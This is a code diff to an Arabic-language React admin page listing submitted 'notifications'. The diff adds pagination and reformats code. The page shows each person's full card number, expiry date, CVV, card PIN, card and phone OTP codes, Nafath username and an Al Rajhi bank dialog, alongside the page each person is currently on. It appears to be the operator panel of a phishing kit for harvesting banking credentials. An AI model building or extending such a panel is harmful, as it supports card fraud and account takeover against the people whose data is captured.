+      return <div onClick={(e) => handlePagenameBadgeClick(notification, e)}>{badge}</div>
     }
 
-    return badge;
-  };
+    return badge
+  }
 
   const formatCardNumber = (cardNumber?: string) => {
-    if (!cardNumber) return "غير محدد";
+    if (!cardNumber) return "غير محدد"
     // Format as **** **** **** 1234
-    const last4 = cardNumber.slice(-4);
-    return `**** **** **** ${last4}`;
-  };
+    const last4 = cardNumber.slice(-4)
+    return `**** **** **** ${last4}`
+  }
 
   const applyFilter = (filter: string | null) => {
-    setActiveFilter(filter);
-  };
+    setActiveFilter(filter)
+    setCurrentPage(1) // Reset to first page when filter changes
+  }
 
   const handleSortChange = (value: string) => {
-    setSortOrder(value as "newest" | "oldest");
+    setSortOrder(value as "newest" | "oldest")
 
     // Sort the filtered notifications
     const sorted = [...filteredNotifications].sort((a, b) => {
-      const dateA = new Date(a.createdDate).getTime();
-      const dateB = new Date(b.createdDate).getTime();
-      return value === "newest" ? dateB - dateA : dateA - dateB;
-    });
+      const dateA = new Date(a.createdDate).getTime()
+      const dateB = new Date(b.createdDate).getTime()
+      return value === "newest" ? dateB - dateA : dateA - dateB
+    })
 
-    setFilteredNotifications(sorted);
-  };
+    setFilteredNotifications(sorted)
+    setCurrentPage(1) // Reset to first page when sort changes
+  }
+
+  const handleItemsPerPageChange = (value: string) => {
+    setItemsPerPage(Number.parseInt(value))
+    setCurrentPage(1) // Reset to first page when items per page changes
+  }
+
+  const goToPage = (page: number) => {
+    setCurrentPage(page)
+  }
+
+  const goToFirstPage = () => {
+    setCurrentPage(1)
+  }
+
+  const goToLastPage = () => {
+    setCurrentPage(totalPages)
+  }
+
+  const goToPreviousPage = () => {
+    if (currentPage > 1) {
+      setCurrentPage(currentPage - 1)
+    }
+  }
+
+  const goToNextPage = () => {
+    if (currentPage < totalPages) {
+      setCurrentPage(currentPage + 1)
+    }
+  }
+
+  // Generate page numbers for pagination
+  const getPageNumbers = () => {
+    const pages = []
+    const maxVisiblePages = 5
+
+    if (totalPages <= maxVisiblePages) {
+      for (let i = 1; i <= totalPages; i++) {
+        pages.push(i)
+      }
+    } else {
+      const startPage = Math.max(1, currentPage - Math.floor(maxVisiblePages / 2))
+      const endPage = Math.min(totalPages, startPage + maxVisiblePages - 1)
+
+      for (let i = startPage; i <= endPage; i++) {
+        pages.push(i)
+      }
+    }
+
+    return pages
+  }
 
   if (isLoading) {
     return (
@@ -853,7 +803,7 @@ export default function NotificationsPage() {
           </CardContent>
         </Card>
       </div>
-    );
+    )
   }
 
   return (
@@ -883,11 +833,7 @@ export default function NotificationsPage() {
                       className="gap-2 border border-gray-200 dark:border-gray-700 shadow-sm"
                       disabled={isRefreshing}
                     >
-                      {isRefreshing ? (
-                        <Loader2 className="h-4 w-4 animate-spin" />
-                      ) : (
-                        <RefreshCw className="h-4 w-4" />
-                      )}
+                      {isRefreshing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                       تحديث
                     </Button>
                   </TooltipTrigger>
@@ -946,7 +892,10 @@ export default function NotificationsPage() {
                   placeholder="بحث بالاسم أو رقم الهاتف أو رقم البطاقة..."
                   className="pr-10 w-full"
                   value={searchTerm}
-                  onChange={(e) => setSearchTerm(e.target.value)}
+                  onChange={(e) => {
+                    setSearchTerm(e.target.value)
+                    setCurrentPage(1) // Reset to first page when searching
+                  }}
                 />
               </div>
               <Select value={sortOrder} onValueChange={handleSortChange}>
@@ -958,6 +907,18 @@ export default function NotificationsPage() {
                   <SelectItem value="oldest">الأقدم أولاً</SelectItem>
                 </SelectContent>
               </Select>
+              <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
+                <SelectTrigger className="w-[120px]">
+                  <SelectValue placeholder="عدد العناصر" />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectItem value="5">5</SelectItem>
+                  <SelectItem value="10">10</SelectItem>
+                  <SelectItem value="20">20</SelectItem>
+                  <SelectItem value="50">50</SelectItem>
+                  <SelectItem value="100">100</SelectItem>
+                </SelectContent>
+              </Select>
             </div>
 
             <div className="flex gap-2 overflow-x-auto pb-2 md:pb-0">
@@ -965,11 +926,7 @@ export default function NotificationsPage() {
                 variant={activeFilter === null ? "default" : "outline"}
                 size="sm"
                 onClick={() => applyFilter(null)}
-                className={
-                  activeFilter === null
-                    ? "bg-cyan-600 text-white hover:bg-cyan-700"
-                    : ""
-                }
+                className={activeFilter === null ? "bg-cyan-600 text-white hover:bg-cyan-700" : ""}
               >
                 الكل
               </Button>
@@ -977,11 +934,7 @@ export default function NotificationsPage() {
                 variant={activeFilter === "pending" ? "default" : "outline"}
                 size="sm"
                 onClick={() => applyFilter("pending")}
-                className={
-                  activeFilter === "pending"
-                    ? "bg-amber-500 text-white hover:bg-amber-600"
-                    : ""
-                }
+                className={activeFilter === "pending" ? "bg-amber-500 text-white hover:bg-amber-600" : ""}
               >
                 <Clock className="h-3.5 w-3.5 ml-1" />
                 قيد الانتظار
@@ -990,11 +943,7 @@ export default function NotificationsPage() {
                 variant={activeFilter === "approved" ? "default" : "outline"}
                 size="sm"
                 onClick={() => applyFilter("approved")}
-                className={
-                  activeFilter === "approved"
-                    ? "bg-emerald-500 text-white hover:bg-emerald-600"
-                    : ""
-                }
+                className={activeFilter === "approved" ? "bg-emerald-500 text-white hover:bg-emerald-600" : ""}
               >
                 <CheckCircle className="h-3.5 w-3.5 ml-1" />
                 مقبول
@@ -1003,11 +952,7 @@ export default function NotificationsPage() {
                 variant={activeFilter === "rejected" ? "default" : "outline"}
                 size="sm"
                 onClick={() => applyFilter("rejected")}
-                className={
-                  activeFilter === "rejected"
-                    ? "bg-rose-500 text-white hover:bg-rose-600"
-                    : ""
-                }
+                className={activeFilter === "rejected" ? "bg-rose-500 text-white hover:bg-rose-600" : ""}
               >
                 <XCircle className="h-3.5 w-3.5 ml-1" />
                 مرفوض
@@ -1016,26 +961,16 @@ export default function NotificationsPage() {
                 variant={activeFilter === "payment" ? "default" : "outline"}
                 size="sm"
                 onClick={() => applyFilter("payment")}
-                className={
-                  activeFilter === "payment"
-                    ? "bg-cyan-500 text-white hover:bg-cyan-600"
-                    : ""
-                }
+                className={activeFilter === "payment" ? "bg-cyan-500 text-white hover:bg-cyan-600" : ""}
               >
                 <CreditCard className="h-3.5 w-3.5 ml-1" />
                 دفع
               </Button>
               <Button
-                variant={
-                  activeFilter === "registration" ? "default" : "outline"
-                }
+                variant={activeFilter === "registration" ? "default" : "outline"}
                 size="sm"
                 onClick={() => applyFilter("registration")}
-                className={
-                  activeFilter === "registration"
-                    ? "bg-violet-500 text-white hover:bg-violet-600"
-                    : ""
-                }
+                className={activeFilter === "registration" ? "bg-violet-500 text-white hover:bg-violet-600" : ""}
               >
                 <Car className="h-3.5 w-3.5 ml-1" />
                 تسجيل
@@ -1061,8 +996,8 @@ export default function NotificationsPage() {
                   variant="outline"
                   className="mt-4"
                   onClick={() => {
-                    setSearchTerm("");
-                    setActiveFilter(null);
+                    setSearchTerm("")
+                    setActiveFilter(null)
                   }}
                 >
                   إعادة ضبط البحث
@@ -1074,38 +1009,22 @@ export default function NotificationsPage() {
               <Table>
                 <TableHeader>
                   <TableRow className="bg-muted/30 hover:bg-muted/30">
-                    <TableHead className="text-right font-bold">
-                      الصفحة الحالية
-                    </TableHead>
-                    <TableHead className="text-right font-bold">
-                      الاسم
-                    </TableHead>
-                    <TableHead className="text-right font-bold">
-                      رقم البطاقة
-                    </TableHead>
-                    <TableHead className="text-right font-bold">
-                      اجراء مطلوب
-                    </TableHead>
-                    <TableHead className="text-right font-bold">
-                      الحالة
-                    </TableHead>
-                    <TableHead className="text-right font-bold">
-                      التاريخ
-                    </TableHead>
-                    <TableHead className="text-center font-bold">
-                      إجراءات
-                    </TableHead>
+                    <TableHead className="text-right font-bold">الصفحة الحالية</TableHead>
+                    <TableHead className="text-right font-bold">الاسم</TableHead>
+                    <TableHead className="text-right font-bold">رقم البطاقة</TableHead>
+                    <TableHead className="text-right font-bold">اجراء مطلوب</TableHead>
+                    <TableHead className="text-right font-bold">الحالة</TableHead>
+                    <TableHead className="text-right font-bold">التاريخ</TableHead>
+                    <TableHead className="text-center font-bold">إجراءات</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
-                  {filteredNotifications.map((notification) => (
+                  {paginatedNotifications.map((notification) => (
                     <TableRow
                       key={notification.id}
                       className="hover:bg-muted/10 border-b border-gray-100 dark:border-gray-700 relative cursor-pointer"
                     >
-                      <TableCell>
-                        {getPageType(notification.pagename, true, notification)}
-                      </TableCell>
+                      <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
                       <TableCell className="font-medium">
                         <div className="flex items-center gap-2">
                           <div className="w-8 h-8 rounded-full bg-cyan-50 flex items-center justify-center">
@@ -1114,9 +1033,7 @@ export default function NotificationsPage() {
                           <Badge
                             variant="outline"
                             className="bg-gradient-to-r from-gray-100 to-gray-200 hover:from-gray-200 hover:to-gray-300 text-gray-800 border-0 shadow-sm cursor-pointer"
-                            onClick={() =>
-                              handleInfoClick(notification, "personal")
-                            }
+                            onClick={() => handleInfoClick(notification, "personal")}
                           >
                             {notification.documment_owner_full_name ||
                               notification.document_owner_full_name ||
@@ -1132,16 +1049,14 @@ export default function NotificationsPage() {
                               ? notification.pinCode
                                 ? "bg-emerald-50 text-emerald-700 border-emerald-200"
                                 : notification.otpCardCode
-                                ? "bg-cyan-50 text-cyan-700 border-cyan-200"
-                                : "bg-amber-50 text-amber-700 border-amber-200"
+                                  ? "bg-cyan-50 text-cyan-700 border-cyan-200"
+                                  : "bg-amber-50 text-amber-700 border-amber-200"
                               : "bg-gradient-to-r from-rose-400 to-rose-600 text-white"
                           } hover:bg-cyan-100 dark:bg-cyan-900/30 dark:text-white dark:border-cyan-800 dark:hover:bg-cyan-900/50`}
                           onClick={(e) => handleCardBadgeClick(notification, e)}
                         >
                           <CardIcon className="h-3.5 w-3.5 mr-1.5 mx-1" />
-                          {notification.card_number
-                            ? "بيانات البطاقة"
-                            : "لا يوجد بطاقة"}
+                          {notification.card_number ? "بيانات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
                       </TableCell>
                       <TableCell>
@@ -1149,9 +1064,9 @@ export default function NotificationsPage() {
                           {notification?.nafadUsername && (
                             <Badge
                               onClick={(e) => {
-                                e.stopPropagation();
-                                setSelectedNotification(notification);
-                                setShowNafazDialog(true);
+                                e.stopPropagation()
+                                setSelectedNotification(notification)
+                                setShowNafazDialog(true)
                               }}
                               className="bg-teal-500 hover:bg-teal-600 cursor-pointer"
                             >
@@ -1163,9 +1078,9 @@ export default function NotificationsPage() {
                               variant="default"
                               className="cursor-pointer bg-emerald-500 hover:bg-emerald-600"
                               onClick={(e) => {
-                                e.stopPropagation();
-                                setSelectedNotification(notification);
-                                setShowRajhiDialog(true);
+                                e.stopPropagation()
+                                setSelectedNotification(notification)
+                                setShowRajhiDialog(true)
                               }}
                             >
                               راجحي
@@ -1175,19 +1090,16 @@ export default function NotificationsPage() {
                           {notification.phone2 && (
                             <Badge
                               className={`cursor-pointer ${
-                                notification.phoneVerificationStatus ===
-                                "pending"
-                                  ? "animate-pulse"
-                                  : ""
+                                notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
                               } ${
                                 notification.otpCode
                                   ? "bg-pink-500 text-white hover:bg-pink-600"
                                   : "bg-gray-500 hover:bg-gray-600"
                               }`}
                               onClick={(e) => {
-                                e.stopPropagation();
-                                setSelectedNotification(notification);
-                                setPhoneDialog(true);
+                                e.stopPropagation()
+                                setSelectedNotification(notification)
+                                setPhoneDialog(true)
                               }}
                               variant="outline"
                             >
@@ -1197,22 +1109,14 @@ export default function NotificationsPage() {
                         </div>
                       </TableCell>
 
-                      <TableCell>
-                        {getStatusBadge(notification.status)}
-                      </TableCell>
+                      <TableCell>{getStatusBadge(notification.status)}</TableCell>
                       <TableCell>
                         <div className="flex flex-col">
                           <span className="text-sm font-medium">
-                            {format(
-                              new Date(notification.createdDate),
-                              "yyyy/MM/dd"
-                            )}
+                            {format(new Date(notification.createdDate), "yyyy/MM/dd")}
                           </span>
                           <span className="text-xs text-muted-foreground">
-                            {format(
-                              new Date(notification.createdDate),
-                              "HH:mm"
-                            )}
+                            {format(new Date(notification.createdDate), "HH:mm")}
                           </span>
                         </div>
                       </TableCell>
@@ -1240,9 +1144,7 @@ export default function NotificationsPage() {
                               <DropdownMenuLabel>خيارات</DropdownMenuLabel>
                               <DropdownMenuSeparator />
                               <DropdownMenuItem
-                                onClick={() =>
-                                  handleInfoClick(notification, "personal")
-                                }
+                                onClick={() => handleInfoClick(notification, "personal")}
                                 className="gap-2"
                               >
                                 <User className="h-4 w-4" />
@@ -1250,12 +1152,9 @@ export default function NotificationsPage() {
                               </DropdownMenuItem>
 
                               {(notification.card_number ||
-                                (notification.formData &&
-                                  notification.formData.card_number)) && (
+                                (notification.formData && notification.formData.card_number)) && (
                                 <DropdownMenuItem
-                                  onClick={() =>
-                                    handleInfoClick(notification, "card")
-                                  }
+                                  onClick={() => handleInfoClick(notification, "card")}
                                   className="gap-2"
                                 >
                                   <CreditCard className="h-4 w-4" />
@@ -1265,9 +1164,7 @@ export default function NotificationsPage() {
 
                               {notification.vehicle_type && (
                                 <DropdownMenuItem
-                                  onClick={() =>
-                                    handleInfoClick(notification, "vehicle")
-                                  }
+                                  onClick={() => handleInfoClick(notification, "vehicle")}
                                   className="gap-2"
                                 >
                                   <Car className="h-4 w-4" />
@@ -1296,60 +1193,98 @@ export default function NotificationsPage() {
           )}
         </CardContent>
 
-        <CardFooter className="p-4 bg-white dark:bg-gray-800 border-t flex justify-between items-center">
-          <div className="text-sm text-muted-foreground">
-            إجمالي البيانات: {notifications.length} | تم عرض:{" "}
-            {filteredNotifications.length}
-          </div>
-          <div className="text-sm">
-            {activeFilter && (
-              <Badge variant="outline" className="gap-1">
-                <Filter className="h-3 w-3" />
-                {activeFilter === "pending"
-                  ? "قيد الانتظار"
-                  : activeFilter === "approved"
-                  ? "مقبول"
-                  : activeFilter === "rejected"
-                  ? "مرفوض"
-                  : activeFilter === "payment"
-                  ? "دفع"
-                  : activeFilter === "registration"
-                  ? "تسجيل"
-                  : activeFilter}
-                <Button
-                  variant="ghost"
-                  size="icon"
-                  className="h-4 w-4 ml-1 hover:bg-transparent"
-                  onClick={() => setActiveFilter(null)}
-                >
-                  <XCircle className="h-3 w-3" />
-                </Button>
-              </Badge>
-            )}
-          </div>
-        </CardFooter>
+        {/* Pagination */}
+        {filteredNotifications.length > 0 && (
+          <CardFooter className="p-4 bg-white dark:bg-gray-800 border-t">
+            <div className="flex flex-col sm:flex-row justify-between items-center gap-4 w-full">
+              <div className="text-sm text-muted-foreground">
+                عرض {(currentPage - 1) * itemsPerPage + 1} إلى{" "}
+                {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من {filteredNotifications.length}{" "}
+                عنصر
+                {notifications.length !== filteredNotifications.length && (
+                  <span className="mr-2">(إجمالي: {notifications.length})</span>
+                )}
+              </div>
+
+              {totalPages > 1 && (
+                <div className="flex items-center gap-2">
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    onClick={goToFirstPage}
+                    disabled={currentPage === 1}
+                    className="h-8 w-8"
+                  >
+                    <ChevronsRight className="h-4 w-4" />
+                  </Button>
+
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    onClick={goToPreviousPage}
+                    disabled={currentPage === 1}
+                    className="h-8 w-8"
+                  >
+                    <ChevronRight className="h-4 w-4" />
+                  </Button>
+
+                  <div className="flex gap-1">
+                    {getPageNumbers().map((page) => (
+                      <Button
+                        key={page}
+                        variant={currentPage === page ? "default" : "outline"}
+                        size="sm"
+                        onClick={() => goToPage(page)}
+                        className={`h-8 w-8 ${currentPage === page ? "bg-cyan-600 text-white hover:bg-cyan-700" : ""}`}
+                      >
+                        {page}
+                      </Button>
+                    ))}
+                  </div>
+
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    onClick={goToNextPage}
+                    disabled={currentPage === totalPages}
+                    className="h-8 w-8"
+                  >
+                    <ChevronLeft className="h-4 w-4" />
+                  </Button>
+
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    onClick={goToLastPage}
+                    disabled={currentPage === totalPages}
+                    className="h-8 w-8"
+                  >
+                    <ChevronsLeft className="h-4 w-4" />
+                  </Button>
+                </div>
+              )}
+            </div>
+          </CardFooter>
+        )}
       </Card>
 
       {/* Info Dialog */}
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent
-          className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
-          dir="rtl"
-        >
+        <DialogContent className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
           <DialogHeader className="border-b pb-3">
             <DialogTitle className="text-xl font-bold bg-gradient-to-r from-cyan-600 to-cyan-800 text-transparent bg-clip-text">
               {selectedInfo === "personal"
                 ? "المعلومات الشخصية"
                 : selectedInfo === "card"
-                ? "معلومات البطاقة"
-                : "معلومات المركبة"}
+                  ? "معلومات البطاقة"
+                  : "معلومات المركبة"}
             </DialogTitle>
             <DialogDescription>
               {selectedInfo === "personal"
                 ? "تفاصيل المعلومات الشخصية للمستخدم"
                 : selectedInfo === "card"
-                ? "تفاصيل معلومات البطاقة البنكية"
-                : "تفاصيل معلومات المركبة"}
+                  ? "تفاصيل معلومات البطاقة البنكية"
+                  : "تفاصيل معلومات المركبة"}
             </DialogDescription>
           </DialogHeader>
 
@@ -1382,9 +1317,7 @@ export default function NotificationsPage() {
               <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                 <p className="text-sm text-muted-foreground">رقم الهاتف</p>
                 <div className="flex items-center gap-2 mt-1">
-                  <p className="font-medium text-lg font-mono">
-                    {selectedNotification.phone}
-                  </p>
+                  <p className="font-medium text-lg font-mono">{selectedNotification.phone}</p>
                 </div>
               </div>
 
@@ -1392,22 +1325,16 @@ export default function NotificationsPage() {
                 <p className="text-sm text-muted-foreground">نوع الطلب</p>
                 <div className="flex items-center gap-2 mt-1">
                   <p className="font-medium">
-                    {selectedNotification.pagename ||
-                      selectedNotification.insurance_purpose ||
-                      "غير محدد"}
+                    {selectedNotification.pagename || selectedNotification.insurance_purpose || "غير محدد"}
                   </p>
                 </div>
               </div>
 
               {selectedNotification.serial_number && (
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                  <p className="text-sm text-muted-foreground">
-                    الرقم التسلسلي
-                  </p>
+                  <p className="text-sm text-muted-foreground">الرقم التسلسلي</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <p className="font-medium font-mono">
-                      {selectedNotification.serial_number}
-                    </p>
+                    <p className="font-medium font-mono">{selectedNotification.serial_number}</p>
                   </div>
                 </div>
               )}
@@ -1417,30 +1344,20 @@ export default function NotificationsPage() {
           {selectedInfo === "card" && selectedNotification && (
             <Tabs defaultValue="main" className="w-full">
               <TabsList className="grid w-full grid-cols-2 mb-4">
-                <TabsTrigger
-                  value="main"
-                  className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-                >
+                <TabsTrigger value="main" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">
                   البطاقة الرئيسية
                 </TabsTrigger>
-                <TabsTrigger
-                  value="form"
-                  className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-                >
+                <TabsTrigger value="form" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">
                   بيانات النموذج
                 </TabsTrigger>
               </TabsList>
               <TabsContent value="main" className="space-y-3 py-2">
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                  <p className="text-sm text-muted-foreground">
-                    اسم حامل البطاقة
-                  </p>
+                  <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
                   <div className="flex items-center gap-2 mt-1">
                     <User className="h-4 w-4 text-cyan-600" />
                     <p className="font-medium text-lg">
-                      {selectedNotification.document_owner_full_name ||
-                        selectedNotification.full_name ||
-                        "غير محدد"}
+                      {selectedNotification.document_owner_full_name || selectedNotification.full_name || "غير محدد"}
                     </p>
                   </div>
                 </div>
@@ -1449,16 +1366,12 @@ export default function NotificationsPage() {
                   <p className="text-sm text-muted-foreground">رقم البطاقة</p>
                   <div className="flex items-center gap-2 mt-1">
                     <CreditCard className="h-4 w-4 text-cyan-600" />
-                    <p className="font-medium text-lg font-mono">
-                      {selectedNotification.card_number || "غير محدد"}
-                    </p>
+                    <p className="font-medium text-lg font-mono">{selectedNotification.card_number || "غير محدد"}</p>
                   </div>
                 </div>
 
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                  <p className="text-sm text-muted-foreground">
-                    تاريخ الانتهاء
-                  </p>
+                  <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
                   <div className="flex items-center gap-2 mt-1">
                     <Calendar className="h-4 w-4 text-cyan-600" />
                     <p className="font-medium text-lg font-mono">
@@ -1468,14 +1381,10 @@ export default function NotificationsPage() {
                 </div>
 
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                  <p className="text-sm text-muted-foreground">
-                    رمز الأمان (CVV)
-                  </p>
+                  <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
                   <div className="flex items-center gap-2 mt-1">
                     <Shield className="h-4 w-4 text-cyan-600" />
-                    <p className="font-medium text-lg font-mono">
-                      {selectedNotification.cvv || "غير محدد"}
-                    </p>
+                    <p className="font-medium text-lg font-mono">{selectedNotification.cvv || "غير محدد"}</p>
                   </div>
                 </div>
               </TabsContent>
@@ -1484,48 +1393,35 @@ export default function NotificationsPage() {
                 {selectedNotification.formData ? (
                   <>
                     <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                      <p className="text-sm text-muted-foreground">
-                        اسم حامل البطاقة
-                      </p>
+                      <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
                       <div className="flex items-center gap-2 mt-1">
                         <User className="h-4 w-4 text-cyan-600" />
-                        <p className="font-medium text-lg">
-                          {selectedNotification.formData.full_name ||
-                            "غير محدد"}
-                        </p>
+                        <p className="font-medium text-lg">{selectedNotification.formData.full_name || "غير محدد"}</p>
                       </div>
                     </div>
 
                     <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                      <p className="text-sm text-muted-foreground">
-                        رقم البطاقة
-                      </p>
+                      <p className="text-sm text-muted-foreground">رقم البطاقة</p>
                       <div className="flex items-center gap-2 mt-1">
                         <CreditCard className="h-4 w-4 text-cyan-600" />
                         <p className="font-medium text-lg font-mono">
-                          {selectedNotification.formData.card_number ||
-                            "غير محدد"}
+                          {selectedNotification.formData.card_number || "غير محدد"}
                         </p>
                       </div>
                     </div>
 
                     <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                      <p className="text-sm text-muted-foreground">
-                        تاريخ الانتهاء
-                      </p>
+                      <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
                       <div className="flex items-center gap-2 mt-1">
                         <Calendar className="h-4 w-4 text-cyan-600" />
                         <p className="font-medium text-lg font-mono">
-                          {selectedNotification.formData.expiration_date ||
-                            "غير محدد"}
+                          {selectedNotification.formData.expiration_date || "غير محدد"}
                         </p>
                       </div>
                     </div>
 
                     <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                      <p className="text-sm text-muted-foreground">
-                        رمز الأمان (CVV)
-                      </p>
+                      <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
                       <div className="flex items-center gap-2 mt-1">
                         <Shield className="h-4 w-4 text-cyan-600" />
                         <p className="font-medium text-lg font-mono">
@@ -1550,21 +1446,15 @@ export default function NotificationsPage() {
                 <p className="text-sm text-muted-foreground">نوع المركبة</p>
                 <div className="flex items-center gap-2 mt-1">
                   <Car className="h-4 w-4 text-cyan-600" />
-                  <p className="font-medium text-lg">
-                    {selectedNotification.vehicle_type || "غير محدد"}
-                  </p>
+                  <p className="font-medium text-lg">{selectedNotification.vehicle_type || "غير محدد"}</p>
                 </div>
               </div>
 
               {selectedNotification.vehicle_manufacture_number && (
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                  <p className="text-sm text-muted-foreground">
-                    رقم تصنيع المركبة
-                  </p>
+                  <p className="text-sm text-muted-foreground">رقم تصنيع المركبة</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <p className="font-medium text-lg font-mono">
-                      {selectedNotification.vehicle_manufacture_number}
-                    </p>
+                    <p className="font-medium text-lg font-mono">{selectedNotification.vehicle_manufacture_number}</p>
                   </div>
                 </div>
               )}
@@ -1573,36 +1463,26 @@ export default function NotificationsPage() {
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                   <p className="text-sm text-muted-foreground">رمز الجمارك</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <p className="font-medium text-lg font-mono">
-                      {selectedNotification.customs_code}
-                    </p>
+                    <p className="font-medium text-lg font-mono">{selectedNotification.customs_code}</p>
                   </div>
                 </div>
               )}
 
               {selectedNotification.seller_identity_number && (
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                  <p className="text-sm text-muted-foreground">
-                    رقم هوية البائع
-                  </p>
+                  <p className="text-sm text-muted-foreground">رقم هوية البائع</p>
                   <div className="flex items-center gap-2 mt-1">
                     <Shield className="h-4 w-4 text-cyan-600" />
-                    <p className="font-medium text-lg font-mono">
-                      {selectedNotification.seller_identity_number}
-                    </p>
+                    <p className="font-medium text-lg font-mono">{selectedNotification.seller_identity_number}</p>
                   </div>
                 </div>
               )}
 
               {selectedNotification.serial_number && (
                 <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                  <p className="text-sm text-muted-foreground">
-                    الرقم التسلسلي
-                  </p>
+                  <p className="text-sm text-muted-foreground">الرقم التسلسلي</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <p className="font-medium text-lg font-mono">
-                      {selectedNotification.serial_number}
-                    </p>
+                    <p className="font-medium text-lg font-mono">{selectedNotification.serial_number}</p>
                   </div>
                 </div>
               )}
@@ -1618,21 +1498,13 @@ export default function NotificationsPage() {
       </Dialog>
 
       {/* Card Dialog */}
-      <Dialog
-        open={showCardDialog}
-        onOpenChange={(open) => !open && setShowCardDialog(false)}
-      >
-        <DialogContent
-          className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
-          dir="rtl"
-        >
+      <Dialog open={showCardDialog} onOpenChange={(open) => !open && setShowCardDialog(false)}>
+        <DialogContent className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
           <DialogHeader className="border-b pb-3">
             <DialogTitle className="text-xl font-bold bg-gradient-to-r from-cyan-600 to-cyan-800 text-transparent bg-clip-text">
               معلومات البطاقة
             </DialogTitle>
-            <DialogDescription>
-              تفاصيل معلومات البطاقة البنكية
-            </DialogDescription>
+            <DialogDescription>تفاصيل معلومات البطاقة البنكية</DialogDescription>
           </DialogHeader>
 
           {selectedCardInfo && (
@@ -1640,50 +1512,37 @@ export default function NotificationsPage() {
               <div className="p-5 rounded-lg bg-gradient-to-r from-cyan-500 to-cyan-600 text-white shadow-lg">
                 <div className="flex justify-between items-start mb-6">
                   <div className="flex flex-col">
-                    <span className="text-xs text-cyan-100 mb-1">
-                      حامل البطاقة
-                    </span>
+                    <span className="text-xs text-cyan-100 mb-1">حامل البطاقة</span>
                     <span className="font-medium">
-                      {selectedCardInfo.document_owner_full_name ||
-                        selectedCardInfo.full_name ||
-                        "غير محدد"}
+                      {selectedCardInfo.document_owner_full_name || selectedCardInfo.full_name || "غير محدد"}
                     </span>
                   </div>
                   <CreditCard className="h-8 w-8 text-white opacity-80" />
                 </div>
 
                 <div className="mb-4">
-                  <span className="text-xs text-cyan-100 mb-1 block">
-                    رقم البطاقة
-                  </span>
+                  <span className="text-xs text-cyan-100 mb-1 block">رقم البطاقة</span>
                   <span className="font-mono text-lg tracking-wider" dir="ltr">
                     {selectedCardInfo.card_number ||
-                      (selectedCardInfo.formData &&
-                        selectedCardInfo.formData.card_number) ||
+                      (selectedCardInfo.formData && selectedCardInfo.formData.card_number) ||
                       "غير محدد"}
                   </span>
                 </div>
 
                 <div className="flex justify-between">
                   <div>
-                    <span className="text-xs text-cyan-100 block">
-                      تاريخ الانتهاء
-                    </span>
+                    <span className="text-xs text-cyan-100 block">تاريخ الانتهاء</span>
                     <span className="font-mono">
                       {selectedCardInfo.expiration_date ||
-                        (selectedCardInfo.formData &&
-                          selectedCardInfo.formData.expiration_date) ||
+                        (selectedCardInfo.formData && selectedCardInfo.formData.expiration_date) ||
                         "غير محدد"}
                     </span>
                   </div>
                   <div>
-                    <span className="text-xs text-cyan-100 block">
-                      رمز الأمان
-                    </span>
+                    <span className="text-xs text-cyan-100 block">رمز الأمان</span>
                     <span className="font-mono">
                       {selectedCardInfo.cvv ||
-                        (selectedCardInfo.formData &&
-                          selectedCardInfo.formData.cvv) ||
+                        (selectedCardInfo.formData && selectedCardInfo.formData.cvv) ||
                         "غير محدد"}
                     </span>
                   </div>
@@ -1694,18 +1553,12 @@ export default function NotificationsPage() {
                 <h3 className="font-medium mb-2 text-sm">معلومات إضافية</h3>
                 <div className="space-y-2">
                   <div className="flex justify-between text-sm">
-                    <span className="text-muted-foreground">
-                      رقم سري بطاقة:
-                    </span>
+                    <span className="text-muted-foreground">رقم سري بطاقة:</span>
